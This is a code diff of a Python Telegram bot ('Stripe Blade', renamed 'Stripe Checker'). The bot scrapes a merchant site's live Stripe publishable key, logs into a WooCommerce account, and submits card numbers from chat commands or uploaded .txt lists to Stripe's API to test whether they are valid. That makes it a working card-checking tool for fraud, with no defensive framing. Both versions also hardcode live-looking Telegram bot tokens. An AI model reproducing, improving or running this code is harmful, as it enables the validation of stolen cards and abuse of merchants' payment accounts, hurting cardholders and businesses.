@@ -1,176 +1,165 @@
-import logging
-import requests
-import json
 import re
+import json
+import aiohttp
+import asyncio
 from bs4 import BeautifulSoup
-from telegram import Update, Document
-from telegram.ext import ApplicationBuilder, MessageHandler, CommandHandler, ContextTypes, filters
+from telegram import Update
+from telegram.ext import (
+    ApplicationBuilder,
+    CommandHandler,
+    MessageHandler,
+    ContextTypes,
+    filters,
+)
 
-# --- CONFIG ---
-BOT_TOKEN = "8153748905:AAGp03pGvNcuL7CAhcOV92jGv2c9opX-BVU"
-logging.basicConfig(level=logging.INFO)
+BOT_TOKEN = "7678348871:AAFKNVn1IAp46iBcTTOwo31i4WlT2KcZWGE"
+user_sessions = {}
 
-# --- STORAGE ---
-user_data = {}
+async def fetch_site_details(session, site_url):
+    async with session.get(site_url, headers={"User-Agent": "Mozilla/5.0"}) as resp:
+        html = await resp.text()
+        soup = BeautifulSoup(html, "html.parser")
+        pk = None
+        api_type = None
 
-# --- HELPERS ---
-def extract_stripe_info(html):
-    soup = BeautifulSoup(html, "html.parser")
-    pk = None
-    stripe_type = None
+        for script in soup.find_all("script"):
+            if script.string:
+                if "pk_live_" in script.string:
+                    match = re.search(r"pk_live_[\w]+", script.string)
+                    if match:
+                        pk = match.group(0)
 
-    scripts = soup.find_all("script")
-    for script in scripts:
-        if script.string and 'pk_live_' in script.string:
-            match = re.search(r'pk_live_[0-9a-zA-Z]+', script.string)
-            if match:
-                pk = match.group()
+                if "setupIntent" in script.string:
+                    api_type = "setup_intent"
+                elif "/v1/payment_methods" in script.string:
+                    api_type = "payment_method"
+                elif "/v1/tokens" in script.string:
+                    api_type = "token"
+                elif "/v1/sources" in script.string:
+                    api_type = "source"
 
-    if "setup_intents" in html:
-        stripe_type = "setup_intent"
-    elif "payment_methods" in html:
-        stripe_type = "payment_method"
-    elif "tokens" in html:
-        stripe_type = "token"
-    elif "sources" in html:
-        stripe_type = "source"
+        return pk, api_type
 
-    return pk, stripe_type
+async def login_and_get_details(site, email, password):
+    login_url = f"{site}/my-account/"
+    add_pm_url = f"{site}/?wc-ajax=add_payment_method"
 
-async def fetch_add_payment_page(url, session):
-    headers = {
-        "User-Agent": "Mozilla/5.0",
-        "Accept": "text/html,application/xhtml+xml",
-    }
-    response = session.get(url, headers=headers)
-    return response.text if response.ok else None
+    async with aiohttp.ClientSession() as session:
+        async with session.get(login_url, headers={"User-Agent": "Mozilla/5.0"}) as resp:
+            html = await resp.text()
+            nonce = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', html)
+            if not nonce:
+                return None
+            nonce = nonce.group(1)
 
-def create_payment_method(card):
-    url = "https://api.stripe.com/v1/payment_methods"
-    headers = {"Content-Type": "application/x-www-form-urlencoded"}
-    data = {
-        "type": "card",
-        "card[number]": card[0],
-        "card[exp_month]": card[1],
-        "card[exp_year]": card[2],
-        "card[cvc]": card[3],
-    }
-    return requests.post(url, headers=headers, data=data)
-
-def submit_to_stripe(card, stripe_type, pk):
-    pm_res = create_payment_method(card)
-    if pm_res.status_code != 200:
-        return pm_res.text
-
-    pm_id = pm_res.json().get("id")
-
-    if stripe_type == "setup_intent":
-        endpoint = "https://api.stripe.com/v1/setup_intents"
-        data = {"payment_method": pm_id, "confirm": "true", "client_secret": f"{pk}_secret_123"}
-    elif stripe_type == "payment_method":
-        endpoint = "https://api.stripe.com/v1/payment_methods"
-        data = {"payment_method": pm_id}
-    elif stripe_type == "token":
-        endpoint = "https://api.stripe.com/v1/tokens"
-        data = {
-            "card[number]": card[0],
-            "card[exp_month]": card[1],
-            "card[exp_year]": card[2],
-            "card[cvc]": card[3],
+        payload = {
+            "username": email,
+            "password": password,
+            "woocommerce-login-nonce": nonce,
+            "_wp_http_referer": "/my-account/",
+            "login": "Log in",
         }
-    elif stripe_type == "source":
-        endpoint = "https://api.stripe.com/v1/sources"
-        data = {
-            "type": "card",
-            "card[number]": card[0],
-            "card[exp_month]": card[1],
-            "card[exp_year]": card[2],
-            "card[cvc]": card[3],
-        }
-    else:
-        return json.dumps({"error": "Unsupported Stripe API type"})
 
-    headers = {"Authorization": f"Bearer {pk}"}
-    res = requests.post(endpoint, headers=headers, data=data)
-    return res.text
+        async with session.post(login_url, data=payload, headers={"User-Agent": "Mozilla/5.0"}) as resp:
+            if "customer-logout" not in await resp.text():
+                return None
 
-def parse_card(combo):
-    parts = combo.strip().split("|")
-    return parts if len(parts) == 4 else None
-
-# --- COMMANDS ---
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Welcome to Stripe Blade.\nUse /addsitelogin to begin.")
+        pk, api_type = await fetch_site_details(session, add_pm_url)
+        return {"pk": pk, "api": api_type, "cookies": session.cookie_jar.filter_cookies(site)}
 
 async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Send the full Add Payment Method URL of the site.")
+    try:
+        args = update.message.text.split(" ", 1)[1]
+        site, email, password = args.strip().split("|")
+        user_id = update.effective_user.id
 
-async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    url = update.message.text.strip()
-    user_id = update.effective_user.id
+        result = await login_and_get_details(site, email, password)
+        if not result or not result["pk"] or not result["api"]:
+            await update.message.reply_text("Failed to extract pk or API type.")
+            return
 
-    session = requests.Session()
-    html = await context.application.run_in_thread(fetch_add_payment_page, url, session)
-    if not html:
-        await update.message.reply_text("Failed to load page.")
-        return
+        user_sessions[user_id] = {
+            "site": site,
+            "email": email,
+            "password": password,
+            "pk": result["pk"],
+            "api": result["api"],
+            "cookies": result["cookies"],
+        }
 
-    pk, api_type = extract_stripe_info(html)
-    if not pk or not api_type:
-        await update.message.reply_text("Failed to extract Stripe info.")
-        return
+        await update.message.reply_text(f"Site login saved!\nPK: {result['pk']}\nAPI: {result['api']}")
+    except Exception as e:
+        await update.message.reply_text(f"Error: {str(e)}")
 
-    user_data[user_id] = {"url": url, "pk": pk, "api": api_type}
-    await update.message.reply_text(f"Saved.\nDetected:\nPK: {pk}\nAPI: {api_type}")
+async def process_card(user_id, card):
+    try:
+        if user_id not in user_sessions:
+            return "Error: Login first using /addsitelogin"
+
+        session = user_sessions[user_id]
+        cc, mm, yy, cvv = card.strip().split("|")
+        yy = yy if len(yy) == 4 else f"20{yy}"
+
+        payload = {
+            "type": "card",
+            "card[number]": cc,
+            "card[cvc]": cvv,
+            "card[exp_month]": mm,
+            "card[exp_year]": yy,
+        }
+
+        url = f"https://api.stripe.com/v1/{'payment_methods' if session['api']=='payment_method' else session['api']}"
+
+        if session["api"] == "setup_intent":
+            payload["usage"] = "off_session"
+        elif session["api"] == "payment_method":
+            payload["card[object]"] = "card"
+
+        headers = {
+            "User-Agent": "Mozilla/5.0",
+            "Authorization": f"Bearer {session['pk']}",
+        }
+
+        async with aiohttp.ClientSession(cookies=session["cookies"]) as s:
+            async with s.post(url, data=payload, headers=headers) as resp:
+                return await resp.text()
+    except Exception as e:
+        return json.dumps({"error": str(e)})
 
 async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in user_data:
-        await update.message.reply_text("Use /addsitelogin first.")
-        return
+    try:
+        args = update.message.text.split(" ", 1)
+        if len(args) < 2:
+            await update.message.reply_text("Usage: /chk cc|mm|yy|cvv")
+            return
 
-    if len(context.args) != 1:
-        await update.message.reply_text("Usage: /chk cc|mm|yy|cvv")
-        return
-
-    combo = context.args[0]
-    card = parse_card(combo)
-    if not card:
-        await update.message.reply_text("Invalid format.")
-        return
-
-    info = user_data[user_id]
-    res = await context.application.run_in_thread(submit_to_stripe, card, info["api"], info["pk"])
-    await update.message.reply_text(f"`{res}`", parse_mode="Markdown")
+        result = await process_card(update.effective_user.id, args[1])
+        await update.message.reply_text(f"`{result}`", parse_mode="Markdown")
+    except Exception as e:
+        await update.message.reply_text(f"Error: {str(e)}")
 
 async def handle_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    doc = update.message.document
-    if doc.mime_type != "text/plain":
-        await update.message.reply_text("Upload a .txt file only.")
-        return
+    file = await update.message.document.get_file()
+    content = await file.download_as_bytearray()
+    combos = content.decode().splitlines()
 
     user_id = update.effective_user.id
-    if user_id not in user_data:
-        await update.message.reply_text("Use /addsitelogin first.")
-        return
+    msg = await update.message.reply_text("Starting check...")
 
-    file = await doc.get_file()
-    content = await file.download_as_bytearray()
-    lines = content.decode().splitlines()
+    for idx, combo in enumerate(combos, 1):
+        result = await process_card(user_id, combo)
+        await msg.edit_text(f"`{result}`", parse_mode="Markdown")
+        await asyncio.sleep(1)
 
-    info = user_data[user_id]
-    for line in lines:
-        card = parse_card(line)
-        if card:
-            res = await context.application.run_in_thread(submit_to_stripe, card, info["api"], info["pk"])
-            await update.message.reply_text(f"`{res}`", parse_mode="Markdown")
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("Welcome to Stripe Checker.\nUse /addsitelogin site|email|password to begin.")
 
-# --- MAIN ---
-app = ApplicationBuilder().token(BOT_TOKEN).build()
-app.add_handler(CommandHandler("start", start))
-app.add_handler(CommandHandler("addsitelogin", addsitelogin))
-app.add_handler(CommandHandler("chk", chk))
-app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r"^https?://"), handle_url))
-app.add_handler(MessageHandler(filters.Document.MimeType("text/plain"), handle_txt))
+if __name__ == "__main__":
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
 
-app.run_polling()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("addsitelogin", addsitelogin))
+    app.add_handler(CommandHandler("chk", chk))
+    app.add_handler(MessageHandler(filters.Document.FILE_EXTENSION("txt"), handle_txt))
+
+    app.run_polling()
